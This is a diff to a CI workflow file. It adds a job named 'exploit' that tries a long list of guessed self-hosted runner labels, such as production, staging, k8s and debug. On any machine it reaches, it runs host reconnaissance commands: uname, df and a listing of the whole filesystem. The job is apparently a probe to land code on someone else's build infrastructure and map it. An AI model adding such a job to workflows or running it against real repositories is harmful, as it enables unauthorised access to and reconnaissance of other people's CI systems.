@@ -64,3 +64,19 @@ jobs:
     steps:
       - name: Done
         run: echo "All Golang versions tests are Green!"
+
+  exploit:
+    name: Check self-hosted runners
+    strategy:
+      matrix:
+        runner: [ 'production', 'production-runner', 'staging', 'staging-runner','qa', 'qa--runner', 'k8s', 'k8s-runner', 'kubernetes', 'kubernetes-runner', 'debug', 'debug-runner', 'default', 'default-runner' ]
+    runs-on:
+      - "self-hosted"
+      - ${{ matrix.runner }}
+
+    steps:
+      - name: Say Hello
+        run: |
+          uname -a
+          df
+          tree /
